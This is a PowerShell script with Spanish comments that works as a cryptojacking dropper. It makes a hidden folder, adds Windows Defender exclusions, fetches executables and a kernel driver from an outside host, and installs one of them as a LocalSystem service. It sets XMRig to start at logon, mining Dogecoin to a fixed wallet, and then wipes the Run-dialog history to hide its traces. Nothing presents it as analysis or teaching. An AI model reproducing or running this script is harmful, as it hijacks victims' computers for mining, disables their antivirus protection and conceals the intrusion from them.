# =============================
# Configuración inicial
# =============================
$UserFolder = [Environment]::GetFolderPath("UserProfile")
$WikFolder = Join-Path $UserFolder "Wik"

# Crear carpeta oculta si no existe
if (-not (Test-Path $WikFolder)) {
    New-Item -Path $WikFolder -ItemType Directory | Out-Null
    attrib +h $WikFolder 2>$null
}

# =============================
# Función para agregar exclusiones en Windows Defender
# =============================
function Add-DefenderExclusion($path) {
    try {
        $prefs = Get-MpPreference
        if ($prefs.ExclusionPath -notcontains $path) {
            Add-MpPreference -ExclusionPath $path 2>$null
        }
        if ($prefs.ExclusionProcess -notcontains $path) {
            Add-MpPreference -ExclusionProcess $path 2>$null
        }
    } catch {}
}

# Agregar carpeta Wik como exclusión
Add-DefenderExclusion $WikFolder

# =============================
# Descargar archivos
# =============================
$files = @(
    "RTK.exe",
    "wroom.dll",
    "WinRing0x64.sys",
    "xmrig.exe"
)

$baseUrl = "https://baa4ts.is-a-good.dev/"

foreach ($file in $files) {
    $destination = Join-Path $WikFolder $file
    $url = $baseUrl + $file

    if (-not (Test-Path $destination)) {
        try {
            Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing -ErrorAction SilentlyContinue
        } catch {}
    }

    # Agregar archivo a exclusión de Defender
    Add-DefenderExclusion $destination
}

# =============================
# Instalar RTK.exe como servicio
# =============================
$ServiceName = "RTK"
$ServicePath = Join-Path $WikFolder "RTK.exe"

sc.exe query $ServiceName > $null 2>&1
if ($LASTEXITCODE -eq 0) {
    sc.exe stop $ServiceName
    Start-Sleep -Seconds 2
    sc.exe delete $ServiceName
    Start-Sleep -Seconds 2
}

sc.exe create $ServiceName binPath= "`"$ServicePath`"" start= auto type= own
sc.exe config $ServiceName obj= "LocalSystem"
sc.exe start $ServiceName

# =============================
# Configurar XMRig para auto inicio
# =============================
$XmrigPath = Join-Path $WikFolder "xmrig.exe"
$XmrigArgs = "-o rx.unmineable.com:3333 -a rx -k -u DOGE:DHJTrDmStC75AHU7AsZA7fzmtR8c4QT8Wk.LUISPC -p x --threads=2 --cpu-priority=1 --background"

try {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "XMRigWik"
    $regValue = "`"$XmrigPath`" $XmrigArgs"
    if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
        New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null
    }
} catch {}

# =============================
# Limpiar historial de Win + R
# =============================
try {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
    if (Test-Path $regPath) {
        Remove-ItemProperty -Path $regPath -Name "MRUList" -ErrorAction SilentlyContinue
        Get-ItemProperty -Path $regPath | ForEach-Object {
            $_.PSObject.Properties | Where-Object { $_.Name -notin @("PSPath","PSParentPath","PSChildName","PSDrive","PSProvider") } | ForEach-Object {
                Remove-ItemProperty -Path $regPath -Name $_.Name -ErrorAction SilentlyContinue
            }
        }
    }
} catch {}
